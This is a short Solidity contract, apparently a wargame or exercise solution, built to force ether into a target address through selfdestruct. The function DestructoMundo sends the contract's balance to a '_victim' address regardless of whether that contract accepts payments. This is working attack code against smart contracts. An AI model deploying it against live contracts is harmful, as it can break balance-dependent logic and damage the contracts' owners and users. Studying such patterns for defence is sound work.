// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {

    constructor() {}

    function DestructoMundo(address payable _victim) payable external{
        selfdestruct(_victim);
    }

    receive() external payable{}

}
